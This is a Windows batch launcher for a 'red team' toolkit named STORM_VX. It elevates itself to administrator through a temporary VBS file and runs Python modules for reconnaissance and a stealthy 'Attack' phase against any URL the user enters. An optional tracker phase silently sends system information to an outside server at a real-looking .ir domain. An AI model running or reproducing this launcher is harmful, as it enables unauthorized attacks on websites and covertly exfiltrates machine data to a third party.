@echo off
chcp 65001 >nul 2>&1
setlocal enabledelayedexpansion
title STORM_VX v2.1

:: ╔══════════════════════════════════════════════════════════════╗
:: ║  STORM_VX v2.1 — Modular Red Team Toolkit                  ║
:: ║  by elite (taha)                                            ║
:: ║  FINDER => TRACKER => TESTER                                ║
:: ╚══════════════════════════════════════════════════════════════╝

:: ── Save path & args BEFORE elevation ──
set "SELF_PATH=%~f0"
set "ALL_ARGS=%*"

:: ── Auto UAC Elevation (VBS, no second window) ──
net session >nul 2>&1
if %errorlevel%==0 goto :is_admin

set "vbsFile=%TEMP%\storm_vx_elevate.vbs"
echo Set UAC = CreateObject^("Shell.Application"^) > "!vbsFile!"
echo UAC.ShellExecute "!SELF_PATH!", "!ALL_ARGS!", "", "runas", 1 >> "!vbsFile!"
cscript //nologo "!vbsFile!" >nul 2>&1
del /f "!vbsFile!" >nul 2>&1
exit /b

:is_admin

echo.
echo   ██╗    ████████╗██████╗ ██╗   ██╗███╗   ██╗ █████╗ ██╗
echo   ██║    ╚══██╔══╝██╔══██╗██║   ██║████╗  ██║██╔══██╗██║
echo   ██║       ██║   ██████╔╝██║   ██║██╔██╗ ██║███████║██║
echo   ██║       ██║   ██╔══██╗██║   ██║██║╚██╗██║██╔══██║██║
echo   ███████╗  ██║   ██║  ██║╚██████╔╝██║ ╚████║██║  ██║███████╗
echo   ╚══════╝  ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝
echo                     V X   v 2 . 1
echo.
echo   [OK] Running as Administrator
echo.

:: ══════════════════════════════════════════════════════════════
::  PYTHON DETECTION
:: ══════════════════════════════════════════════════════════════
set "PYTHON="
where python >nul 2>&1
if %errorlevel%==0 (
    set "PYTHON=python"
) else (
    where python3 >nul 2>&1
    if %errorlevel%==0 (
        set "PYTHON=python3"
    ) else (
        echo   [ERROR] Python not found! Install Python 3.
        pause
        exit /b 1
    )
)

:: ══════════════════════════════════════════════════════════════
::  FILE DISCOVERY — search ROOT, subdirs, download/
:: ══════════════════════════════════════════════════════════════
set "ROOT_DIR=%~dp0"
cd /d "%ROOT_DIR%"

:: --- VF_FINDER.py ---
set "FINDER_PATH="
for %%D in ("%ROOT_DIR%" "%ROOT_DIR%finder\" "%ROOT_DIR%download\") do (
    if not defined FINDER_PATH if exist "%%~DVF_FINDER.py" set "FINDER_PATH=%%~DVF_FINDER.py"
)

:: --- VF_TESTER.py ---
set "TESTER_PATH="
for %%D in ("%ROOT_DIR%" "%ROOT_DIR%tester\" "%ROOT_DIR%download\") do (
    if not defined TESTER_PATH if exist "%%~DVF_TESTER.py" set "TESTER_PATH=%%~DVF_TESTER.py"
)

:: --- VF_TRACKER.py ---
set "TRACKER_PATH="
for %%D in ("%ROOT_DIR%" "%ROOT_DIR%tracker\" "%ROOT_DIR%download\") do (
    if not defined TRACKER_PATH if exist "%%~DVF_TRACKER.py" set "TRACKER_PATH=%%~DVF_TRACKER.py"
)

:: --- Verify core files ---
if not defined FINDER_PATH (
    echo   [ERROR] VF_FINDER.py not found!
    pause
    exit /b 1
)
if not defined TESTER_PATH (
    echo   [ERROR] VF_TESTER.py not found!
    pause
    exit /b 1
)

:: --- PYTHONPATH ---
set "PYTHONPATH=%ROOT_DIR%;%ROOT_DIR%finder;%ROOT_DIR%tester;%ROOT_DIR%tracker;%PYTHONPATH%"

echo   [OK] Python  : %PYTHON%
echo   [OK] FINDER  : !FINDER_PATH!
echo   [OK] TESTER  : !TESTER_PATH!
if defined TRACKER_PATH (
    echo   [OK] TRACKER : !TRACKER_PATH!
) else (
    echo   [WARN] VF_TRACKER.py not found
)
echo.

:: ══════════════════════════════════════════════════════════════
::  ARGUMENT PARSING
:: ══════════════════════════════════════════════════════════════
set "TARGET_URL="
set "FINDER_FLAGS=--deep"
set "TESTER_FLAGS="
set "RUN_TRACKER=0"

:parse_args
if "%~1"=="" goto :done_parsing
if /i "%~1"=="elite" ( shift & goto :parse_args )
if /i "%~1"=="--tracker" ( set "RUN_TRACKER=1" & shift & goto :parse_args )
if /i "%~1"=="--deep" ( shift & goto :parse_args )
if /i "%~1"=="--no-deep" ( set "FINDER_FLAGS=" & shift & goto :parse_args )
if /i "%~1"=="--dns" ( set "FINDER_FLAGS=!FINDER_FLAGS! --dns" & shift & goto :parse_args )
if /i "%~1"=="--stealth" ( set "TESTER_FLAGS=--stealth" & shift & goto :parse_args )
set "TARGET_URL=%~1"
shift
goto :parse_args
:done_parsing

:: ── Ask for URL if not provided ──
if not "!TARGET_URL!"=="" goto :url_ready
echo   ─────────────────────────────────────────────
echo    Enter target URL (e.g. https://target.com)
echo   ─────────────────────────────────────────────
echo.
set /p "TARGET_URL=   URL: "

:: ── Interactive tracker prompt ──
if "!TRACKER_PATH!"=="" goto :tracker_skip_prompt
if not "!RUN_TRACKER!"=="0" goto :tracker_skip_prompt
echo.
set /p "ENABLE_TRACKER=   Enable tracker? [y/N]: "
if /i "!ENABLE_TRACKER!"=="y" set "RUN_TRACKER=1"
:tracker_skip_prompt

if "!TARGET_URL!"=="" (
    echo   [ERROR] No URL provided.
    pause
    exit /b 1
)

:: ── Parse flags from URL input ──
set "CLEAN_URL="
for %%W in (!TARGET_URL!) do (
    if /i "%%W"=="--tracker" (
        set "RUN_TRACKER=1"
    ) else if /i "%%W"=="--deep" (
        rem already default
    ) else if /i "%%W"=="--no-deep" (
        set "FINDER_FLAGS="
    ) else if /i "%%W"=="--stealth" (
        set "TESTER_FLAGS=--stealth"
    ) else (
        if "!CLEAN_URL!"=="" (
            set "CLEAN_URL=%%W"
        ) else (
            set "CLEAN_URL=!CLEAN_URL! %%W"
        )
    )
)
if "!RUN_TRACKER!"=="1" set "TARGET_URL=!CLEAN_URL!"

:url_ready

:: ── Auto-add https:// ──
echo.!TARGET_URL! | findstr /i "^https:// ^http://" >nul 2>&1
if errorlevel 1 set "TARGET_URL=https://!TARGET_URL!"

:url_set
echo.

:: ══════════════════════════════════════════════════════════════
::  PHASE 0: TRACKER (optional, --tracker flag)
:: ══════════════════════════════════════════════════════════════
if not "!RUN_TRACKER!"=="1" goto :skip_tracker
if "!TRACKER_PATH!"=="" goto :tracker_not_found

echo   ═════════════════════════════════════════════
echo   [PHASE 0] VF_TRACKER — Sending system info
echo   ═════════════════════════════════════════════
echo.

:: Run tracker SYNCHRONOUSLY with 30-second timeout via PowerShell
:: This prevents the freeze caused by start /b + process polling
powershell -NoProfile -Command "& { $p = Start-Process -FilePath '!PYTHON!' -ArgumentList '!TRACKER_PATH! --silent --server http://namme.taskinoteam.ir/receive.php' -NoNewWindow -PassThru; if (-not $p.WaitForExit(30000)) { $p.Kill(); Write-Host '  [WARN] Tracker timed out (30s)' } }" 2>nul

echo.
echo   [OK] Tracker complete.
echo.
goto :tracker_done

:tracker_not_found
echo   [WARN] Tracker requested but not found. Skipping.
echo.
goto :tracker_done

:skip_tracker
echo   [INFO] Tracker skipped (use --tracker to enable)
echo.

:tracker_done

:: ══════════════════════════════════════════════════════════════
::  PHASE 1: VF_FINDER — Reconnaissance
:: ══════════════════════════════════════════════════════════════
echo   ═════════════════════════════════════════════
echo   [PHASE 1] VF_FINDER — Reconnaissance
echo   ═════════════════════════════════════════════
echo   Target: !TARGET_URL!
echo.

%PYTHON% "!FINDER_PATH!" "!TARGET_URL!" !FINDER_FLAGS! --output VF_PROFILE.json

if not exist "VF_PROFILE.json" (
    echo   [ERROR] Profile not created! FINDER failed.
    pause
    exit /b 1
)

echo.
echo   [OK] Profile saved: VF_PROFILE.json
echo.

:: ══════════════════════════════════════════════════════════════
::  PHASE 2: VF_TESTER — Attack
:: ══════════════════════════════════════════════════════════════
echo   ═════════════════════════════════════════════
echo   [PHASE 2] VF_TESTER — Attack
echo   ═════════════════════════════════════════════
echo   Profile: VF_PROFILE.json
echo.

%PYTHON% "!TESTER_PATH!" --profile VF_PROFILE.json !TESTER_FLAGS!

echo.
echo   ═════════════════════════════════════════════
echo   [DONE] Pipeline completed.
echo   ═════════════════════════════════════════════
echo.
pause
